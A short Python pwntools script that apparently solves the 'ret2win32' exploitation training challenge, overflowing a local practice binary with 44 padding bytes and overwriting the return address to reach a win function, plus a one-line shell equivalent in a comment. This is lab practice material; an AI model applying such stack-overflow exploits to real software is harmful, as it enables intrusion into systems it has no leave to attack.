from pwn import *

ret2win = 0x08048659

p = process('./ret2win32')

padding = 'A'*44
exploit = padding + p32(ret2win)

p.recvuntil('>')
p.sendline(exploit)

print p.recvuntil('}')

# python -c "print 'A'*44 + '\x59\x86\x04\x08'" | ./ret2win32